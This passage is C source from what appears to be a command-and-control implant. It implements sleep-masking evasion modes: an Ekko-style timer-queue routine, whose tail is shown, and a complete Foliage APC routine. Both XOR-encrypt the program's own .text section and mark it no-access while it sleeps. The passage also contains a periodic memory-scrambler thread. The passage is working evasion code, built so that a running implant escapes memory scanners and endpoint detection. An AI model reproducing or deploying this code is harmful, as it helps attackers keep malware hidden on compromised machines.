    g_DeleteTimerQueueEx(hQ, (HANDLE)(LONG_PTR)(-1));

    /* Emergency recovery: if the decrypt callback didn't fire (timer thread
     * crash, system overload, etc.), .text is still NOACCESS+garbled.
     * Restore it here — if we return with .text inaccessible the CPU will
     * fault executing WinMain (the return address on our stack). */
    if (wait_rc != WAIT_OBJECT_0 && InterlockedOr(&g_ekko_ctx.encrypted, 0)) {
        DWORD old;
        unsigned char *t2 = (unsigned char*)g_ekko_ctx.text;
        if (!g_VProt(t2, g_ekko_ctx.text_sz, PAGE_EXECUTE_READWRITE, &old))
            g_VProt(t2, g_ekko_ctx.text_sz, PAGE_READWRITE, &old);
        for (SIZE_T i = 0; i < g_ekko_ctx.text_sz; i++) t2[i] ^= 0xA7;
        g_VProt(t2, g_ekko_ctx.text_sz, PAGE_EXECUTE_READ, &old);
    }

    g_CloseHandle(g_ekko_ctx.event);
    g_ekko_ctx.event = NULL;
}

/* ─────────────────────────── MODE 4: FOLIAGE ──────────────────────────── */
#elif AGENT_SLEEP_MASK_MODE == 4

/* All three APC routines and the thread entry live in .evasn so they are
 * reachable while .text is PAGE_NOACCESS. */

__attribute__((section(".evasn"), noinline))
static VOID NTAPI foliage_encrypt_apc(PVOID ctx, PVOID a2, PVOID a3) {
    (void)a2; (void)a3;
    FoliageCtx *c = (FoliageCtx*)ctx;
    unsigned char *t = (unsigned char*)c->text;
    DWORD old;
    if (!g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old)) return;
    for (SIZE_T i = 0; i < c->text_sz; i++) t[i] ^= 0xA7;
    g_VProt(t, c->text_sz, PAGE_NOACCESS, &old);
    InterlockedExchange(&c->encrypted, 1);
}

__attribute__((section(".evasn"), noinline))
static VOID NTAPI foliage_sleep_apc(PVOID ctx, PVOID a2, PVOID a3) {
    (void)a2; (void)a3;
    FoliageCtx *c = (FoliageCtx*)ctx;
    LARGE_INTEGER t;
    t.QuadPart = -(LONGLONG)c->ms * 10000LL;
    g_NtDelay(FALSE, &t);
}

__attribute__((section(".evasn"), noinline))
static VOID NTAPI foliage_decrypt_apc(PVOID ctx, PVOID a2, PVOID a3) {
    (void)a2; (void)a3;
    FoliageCtx *c = (FoliageCtx*)ctx;
    unsigned char *t = (unsigned char*)c->text;
    DWORD old;
    if (!g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old))
        g_VProt(t, c->text_sz, PAGE_READWRITE, &old);
    for (SIZE_T i = 0; i < c->text_sz; i++) t[i] ^= 0xA7;
    g_VProt(t, c->text_sz, PAGE_EXECUTE_READ, &old);
    InterlockedExchange(&c->encrypted, 0);
    g_SetEvent(c->event);
}

/* Thread entry: drain the APC queue then exit. Lives in .evasn. */
__attribute__((section(".evasn"), noinline))
static DWORD WINAPI foliage_thread_entry(PVOID arg) {
    (void)arg;
    g_NtTestAlert();   /* process all queued APCs (encrypt→sleep→decrypt) */
    return 0;
}

__attribute__((section(".evasn"), noinline))
void sleep_masked(DWORD ms) {
    if (!g_text || !g_VProt || !g_NtDelay || !g_CreateEvent || !g_SetEvent ||
        !g_CloseHandle || !g_WaitForSingleObject || !g_NtCreateThreadEx ||
        !g_NtQueueApcThread || !g_NtAlertResumeThread || !g_NtTestAlert)
        { plain_sleep(ms); return; }

    if (InterlockedOr(&g_conn_thread_count, 0) > 0) { plain_sleep(ms); return; }

    DWORD probe;
    if (!g_VProt(g_text, g_tsz, PAGE_EXECUTE_READWRITE, &probe)) { plain_sleep(ms); return; }
    g_VProt(g_text, g_tsz, PAGE_EXECUTE_READ, &probe);

    g_foliage_ctx.text      = g_text;
    g_foliage_ctx.text_sz   = g_tsz;
    g_foliage_ctx.ms        = ms;
    g_foliage_ctx.encrypted = 0;
    g_foliage_ctx.event     = g_CreateEvent(NULL, FALSE, FALSE, NULL);
    if (!g_foliage_ctx.event) { plain_sleep(ms); return; }

    /* Create thread suspended; it will drain the APC queue on alert-resume */
    HANDLE hThread = NULL;
    LONG status = g_NtCreateThreadEx(
        &hThread,
        0x1FFFFF,               /* THREAD_ALL_ACCESS */
        NULL,
        (HANDLE)(LONG_PTR)(-1), /* NtCurrentProcess() */
        foliage_thread_entry,
        NULL,
        0x1,                    /* CREATE_SUSPENDED */
        0, 0, 0, NULL);
    if (status != 0 || !hThread) {
        g_CloseHandle(g_foliage_ctx.event);
        plain_sleep(ms);
        return;
    }

    /* Queue APCs: encrypt → sleep → decrypt (FIFO order) */
    g_NtQueueApcThread(hThread, foliage_encrypt_apc, &g_foliage_ctx, NULL, NULL);
    g_NtQueueApcThread(hThread, foliage_sleep_apc,   &g_foliage_ctx, NULL, NULL);
    g_NtQueueApcThread(hThread, foliage_decrypt_apc, &g_foliage_ctx, NULL, NULL);

    /* Alert-resume: thread wakes and processes its APC queue */
    g_NtAlertResumeThread(hThread, NULL);

    /* Park main thread in ntdll until decrypt APC fires SetEvent */
    DWORD wait_rc = g_WaitForSingleObject(g_foliage_ctx.event, ms + 15000);

    g_CloseHandle(hThread);

    if (wait_rc != WAIT_OBJECT_0 && InterlockedOr(&g_foliage_ctx.encrypted, 0)) {
        DWORD old;
        unsigned char *t2 = (unsigned char*)g_foliage_ctx.text;
        if (!g_VProt(t2, g_foliage_ctx.text_sz, PAGE_EXECUTE_READWRITE, &old))
            g_VProt(t2, g_foliage_ctx.text_sz, PAGE_READWRITE, &old);
        for (SIZE_T i = 0; i < g_foliage_ctx.text_sz; i++) t2[i] ^= 0xA7;
        g_VProt(t2, g_foliage_ctx.text_sz, PAGE_EXECUTE_READ, &old);
    }

    g_CloseHandle(g_foliage_ctx.event);
    g_foliage_ctx.event = NULL;
}

/* ───────────────────── MODE 0 (default): no masking ───────────────────── */
#else /* AGENT_SLEEP_MASK_MODE == 0 */

__attribute__((section(".evasn"), noinline))
void sleep_masked(DWORD ms) {
    plain_sleep(ms);
}

#endif /* AGENT_SLEEP_MASK_MODE */

/* ── MEM_FLUCTUATE — periodic XOR scrambler daemon ─────────────────────── */

#define MEM_SCRAMBLE_KEY 0xA7

static volatile int  g_scrambler_stop    = 0;
static int           g_scrambler_running = 0;
static HANDLE        g_scrambler_thread  = NULL;
static unsigned char g_scrambler_buf[4096];

static DWORD WINAPI scrambler_thread_proc(LPVOID p) {
    DWORD interval_ms = (DWORD)(uintptr_t)p;
    int encrypted = 0;
    while (!g_scrambler_stop) {
        Sleep(interval_ms);
        if (g_scrambler_stop) break;
        for (int i = 0; i < 4096; i++)
            g_scrambler_buf[i] ^= MEM_SCRAMBLE_KEY;
        encrypted = !encrypted;
    }
    if (encrypted)
        for (int i = 0; i < 4096; i++)
            g_scrambler_buf[i] ^= MEM_SCRAMBLE_KEY;
    return 0;
}

void mem_fluctuate_stop(void) {
    if (!g_scrambler_running) return;
    g_scrambler_stop = 1;
    if (g_scrambler_thread) {
        WaitForSingleObject(g_scrambler_thread, 5000);
        CloseHandle(g_scrambler_thread);
        g_scrambler_thread = NULL;
    }
    g_scrambler_running = 0;
    g_scrambler_stop    = 0;
}

void mem_fluctuate_start(int interval_sec) {
    mem_fluctuate_stop();
    DWORD ms = (DWORD)(interval_sec > 0 ? interval_sec : 10) * 1000;
    g_scrambler_stop   = 0;
    g_scrambler_thread = CreateThread(NULL, 0, scrambler_thread_proc,
        (LPVOID)(uintptr_t)ms, 0, NULL);
    if (g_scrambler_thread) g_scrambler_running = 1;
}
